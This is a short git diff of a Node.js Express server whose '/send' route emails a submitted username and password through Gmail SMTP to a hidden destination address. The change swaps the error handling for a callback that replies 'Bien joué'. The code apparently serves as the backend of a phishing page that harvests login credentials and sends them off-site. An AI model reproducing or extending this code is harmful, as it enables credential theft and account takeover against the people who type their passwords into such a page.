@@ -21,7 +21,6 @@ app.use(express.static('./'));
 
 
 app.post('/send', async (req, res) => {
-  try{
     var transporter = nodemailer.createTransport({
         host: "smtp.gmail.com",
         port: 587,
@@ -37,12 +36,13 @@ app.post('/send', async (req, res) => {
     to: process.env.DESTINATION, // list of receivers
     subject: "Identifiant", // Subject line
     text: "Username : " + req.body.username + "\n" + "Password : " + req.body.password, // plain text body
+    }, (err, info) => {
+      if(err){
+        res.status(400).send(err);
+      }else{
+        res.status(200).send("Bien joué");
+      }
     });
-
-    res.status(200).send('Operation realisé')
-  }catch{
-    res.status(400).send('Erreur')
-  }
 
 })
 
